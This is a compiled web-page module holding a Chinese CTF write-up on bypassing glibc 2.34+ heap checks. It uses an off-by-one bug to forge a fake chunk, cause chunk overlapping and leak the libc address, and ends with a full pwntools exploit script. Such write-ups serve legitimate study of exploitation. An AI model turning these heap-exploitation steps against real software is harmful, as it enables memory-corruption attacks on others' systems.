import{_ as n}from"./plugin-vue_export-helper-x3n3nnut.js";import{o as s,c as a,e as p}from"./app-sBtzFhHn.js";const t={},e=p(`<h1 id="vctf-apples-leak-libc操作复现-高版本的overlapping" tabindex="-1"><a class="header-anchor" href="#vctf-apples-leak-libc操作复现-高版本的overlapping" aria-hidden="true">#</a> vctf apples leak libc操作复现(高版本的overlapping)</h1><blockquote><p>题目中存在off_by_one libc版本2.34以上我们没办法使用常规的overlapping 泄露libc地址</p><p>所以我们要精心构造一个chunk head来绕过新版本的检查机制 实现leak libc的操作</p><p>文章中我们先讲原理 在最后会将Arahat0师傅的脚本给出来()</p></blockquote><h2 id="安全检查机制" tabindex="-1"><a class="header-anchor" href="#安全检查机制" aria-hidden="true">#</a> 安全检查机制</h2><ul><li><p>2.34下的合并检查机制</p><ul><li>检查size是否对得上</li></ul><figure><img src="https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325110240440.png" alt="image-20240325110240440" tabindex="0" loading="lazy"><figcaption>image-20240325110240440</figcaption></figure><ul><li><p>unlink检查</p><figure><img src="https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325110339049.png" alt="image-20240325110339049" tabindex="0" loading="lazy"><figcaption>image-20240325110339049</figcaption></figure></li></ul></li></ul><h2 id="利用原理" tabindex="-1"><a class="header-anchor" href="#利用原理" aria-hidden="true">#</a> 利用原理</h2><blockquote><p>这里先简单说一下我们要干什么</p><p>后面详细说一下我们的利用流程</p></blockquote><ul><li>构造一个chunkheader 让它的size fd bk都符合检查机制</li></ul><h2 id="利用" tabindex="-1"><a class="header-anchor" href="#利用" aria-hidden="true">#</a> 利用</h2><h3 id="构造chunk-header" tabindex="-1"><a class="header-anchor" href="#构造chunk-header" aria-hidden="true">#</a> 构造chunk header</h3><blockquote><p>主要是构造合法的size fd bk 我们把我们构造的chunk叫做fake chunk</p></blockquote><ul><li><p>代码</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 0  290</span>
add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 1  6b0</span>
add<span class="token punctuation">(</span><span class="token number">0x430</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 2  7c0</span>
add<span class="token punctuation">(</span><span class="token number">0x430</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 3  c00</span>
add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 4  1040</span>
add<span class="token punctuation">(</span><span class="token number">0x480</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 5  1150</span>
add<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 6  15e0</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 7  1a10</span>

free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
<span class="token comment"># 触发合并 然后合成一个0x860的大chunk 让我们可以分割</span>
<span class="token comment"># 并且我们的fd和bk在0x430+16字节的位置 也就是0x440位置存在fd和bk</span>
free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token comment"># add一个比chunk 0 chunk6都大的chunk这样就会去分割0x860chunk 然后我们控制我们的payload 设置一个size到原本size的地方</span>
<span class="token comment"># 这样fd和bk分别指向chunk 0 和chunk 6 这样我们可以构造一个 合法的chunk head头</span>
add<span class="token punctuation">(</span><span class="token number">0x450</span><span class="token punctuation">,</span> <span class="token string">b&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">0x438</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0x551</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 0</span>
<span class="token comment"># 将 chunk3 变为allocted</span>
add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 2</span>
add<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 3</span>
add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 6</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>free 3个chunk(chunk0 chunk3 chunk6) 这样chunk3(的fd和bk分别指向chunk 0 chunk6</p><blockquote><p>这里需要特殊说明 这里的chunk3的地址要特殊一些 也就是最低的地址为00 这样方便我们后面使用off_by_one漏洞来实现修改fd/bk的低地址为0来让FD-&gt;bk BK-&gt;fd 指向我们伪造的chunk (后面会详细说明)</p></blockquote></li><li><p>free 一个chunk 让两个chunk(chunk3 与chun2)合并 这样就保留了fd(chunk 0)和bk(chunk6)在一个大的chunk中</p></li><li><p>然后我们将这个大chunk分割为chunk3 和chunk4 让我们自己构造的size刚好覆盖在原chunk3 size 位置 详细看下方图</p></li></ul><figure><img src="https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325111430446.png" alt="image-20240325111430446" tabindex="0" loading="lazy"><figcaption>image-20240325111430446</figcaption></figure><ul><li><p>分割大chunk 并且构造size</p><figure><img src="https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325111521964.png" alt="image-20240325111521964" tabindex="0" loading="lazy"><figcaption>image-20240325111521964</figcaption></figure></li></ul><p>​</p><ul><li>这里我们已经成功构造好了 size和fd bk 那么后面我们就要想办法让chunk 0的bk 和chunk6的fd指向我们构造的chunk</li></ul><h3 id="构造fd-bk" tabindex="-1"><a class="header-anchor" href="#构造fd-bk" aria-hidden="true">#</a> 构造FD-&gt;bk</h3><blockquote><p>这里主要是利用先让chunk0的bk 指向chunk3 然后利用off_by_one漏洞覆写bk 指向我们的fake chunk</p></blockquote><ul><li><p>代码</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># 覆写chunk0的fd</span>
free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token comment">#free的chunk 3</span>
free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">#free的chunk 0</span>
add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 2</span>
add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 6</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>示意图</p><figure><img src="https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325114920279.png" alt="image-20240325114920279" tabindex="0" loading="lazy"><figcaption>image-20240325114920279</figcaption></figure></li></ul><h3 id="构造bk-fd" tabindex="-1"><a class="header-anchor" href="#构造bk-fd" aria-hidden="true">#</a> 构造BK-&gt;fd</h3><blockquote><p>这里就要复杂一点了 因为修改chunk 6 的fd不能像修改FD-&gt;bk那样直接free 然后add</p><p>我们需要利用 合并机制来修改 也就是先free chunk3 chunk 6 以及chunk5 触发chunk6和chunk5合并</p><p>然后我们分割一个chunk 5出来 并且向原本chunk6 size fd位置赋值</p></blockquote><ul><li><p>代码</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0x4f0</span><span class="token punctuation">,</span> <span class="token string">b&quot;b&quot;</span> <span class="token operator">*</span> <span class="token number">0x488</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x431</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 3</span>
add<span class="token punctuation">(</span><span class="token number">0x3b0</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 5</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>示意图</p></li></ul><figure><img src="https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325115900055.png" alt="image-20240325115900055" tabindex="0" loading="lazy"><figcaption>image-20240325115900055</figcaption></figure><ul><li>add后</li></ul><figure><img src="https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325135125545.png" alt="image-20240325135125545" tabindex="0" loading="lazy"><figcaption>image-20240325135125545</figcaption></figure><h3 id="构造合并chunk" tabindex="-1"><a class="header-anchor" href="#构造合并chunk" aria-hidden="true">#</a> 构造合并chunk</h3><blockquote><p>这里就要简单很多了 就是利用一次合并机制和分割机制 造成prev_inuse变为0 并且构造好prev_size</p><p>只不过我们还是得调整一下要选择合并的chunk的位置 因为我们刚才构造的fake chunk大小为0x550所以我们要在fake chunk往下0x550位置弄出一个 allocted chunk</p><p>下面的解释其实有失偏颇 因为其实是我们专门计算的0x550这个数据 刚好对上一个chunk 但是为了方便理解我们选择倒推的方式</p></blockquote><ul><li><p>代码</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token function">free</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>

<span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x108</span><span class="token punctuation">,</span> b<span class="token string">&quot;c&quot;</span> <span class="token operator">*</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0x550</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  # <span class="token number">4</span>
<span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  # <span class="token number">6</span>
<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  # <span class="token number">3</span>
<span class="token function">show</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>首先我们看一下 fakechunk 0x550偏移位置坐标在哪里</p><figure><img src="https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325145741621.png" alt="image-20240325145741621" tabindex="0" loading="lazy"><figcaption>image-20240325145741621</figcaption></figure><figure><img src="https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325145825097.png" alt="image-20240325145825097" tabindex="0" loading="lazy"><figcaption>image-20240325145825097</figcaption></figure></li><li><p>根据地址我们知道 也就是我们要修改的chunk为chunk 5 那么我们就去free掉chunk 4(大小0x110)然后malloc回来 写入数据覆盖到chunk 5的prev_inuse 并且构造好0x550的prev_size</p></li><li><p>示意图</p><figure><img src="https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325150321671.png" alt="image-20240325150321671" tabindex="0" loading="lazy"><figcaption>image-20240325150321671</figcaption></figure></li><li><p>此时我们成功完成构造 最后只需要 free掉chunk 5触发合并机制 然后我们成功完成一次overlapping 可喜可贺</p></li></ul><h2 id="脚本" tabindex="-1"><a class="header-anchor" href="#脚本" aria-hidden="true">#</a> 脚本</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from pwncli import *</span>

<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;tmux&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">)</span>
local <span class="token operator">=</span> <span class="token number">1</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&#39;./vuln&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    p <span class="token operator">=</span> gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">&#39;./vuln&#39;</span><span class="token punctuation">,</span><span class="token string">&quot;b *main+57&quot;</span><span class="token punctuation">)</span>
    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&#39;./libc.so&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&#39;&#39;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&#39;./libc.so&#39;</span><span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span> s<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span> s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span> s<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span> s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>




<span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;&gt;&gt; &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cmd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;How many students do you want to add: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Gender (m/f): &quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;m&quot;</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Size: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">&quot;Content:&quot;</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;--------------\\nadd一个\\n--------------&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># gender,content,size</span>
    cmd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Enter the index of the student: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    cmd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;--------------\\nshow一个\\n--------------&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># gender,content,size</span>
    cmd<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Enter the index of the student: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    cmd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;--------------\\n删除一个\\n--------------&quot;</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 0  290</span>
add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 1  6b0</span>
add<span class="token punctuation">(</span><span class="token number">0x430</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 2  7c0</span>
add<span class="token punctuation">(</span><span class="token number">0x430</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 3  c00</span>
add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 4  1040</span>
add<span class="token punctuation">(</span><span class="token number">0x480</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 5  1150</span>
add<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 6  15e0</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 7  1a10</span>

free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
<span class="token comment"># 触发合并 然后合成一个0x860的大chunk 让我们可以分割</span>
<span class="token comment"># 并且我们的fd和bk在0x430+16字节的位置 也就是0x440位置存在fd和bk</span>
free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token comment"># add一个比chunk 0 chunk6都大的chunk这样就会去分割0x860chunk 然后我们控制我们的payload 设置一个size到原本size的地方</span>
<span class="token comment"># 这样fd和bk分别指向chunk 0 和chunk 6 这样我们可以构造一个 合法的chunk head头</span>
add<span class="token punctuation">(</span><span class="token number">0x450</span><span class="token punctuation">,</span> <span class="token string">b&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">0x438</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0x551</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 0</span>
<span class="token comment"># 将 chunk3 变为allocted</span>
add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 2</span>
add<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 3</span>
add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 6</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;构造fake chunk成功&quot;</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 2</span>
add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 6</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;构造FD-&gt;bk成功&quot;</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0x4f0</span><span class="token punctuation">,</span> <span class="token string">b&quot;b&quot;</span> <span class="token operator">*</span> <span class="token number">0x488</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x431</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 3</span>
add<span class="token punctuation">(</span><span class="token number">0x3b0</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 5</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;构造BK-&gt;fd成功&quot;</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0x108</span><span class="token punctuation">,</span> <span class="token string">b&quot;c&quot;</span> <span class="token operator">*</span> <span class="token number">0x100</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x550</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 4</span>
add<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 6</span>
free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># 3</span>
show<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,29),o=[e];function c(u,l){return s(),a("div",null,o)}const r=n(t,[["render",c],["__file","vctf_leak_libc.html.vue"]]);export{r as default};
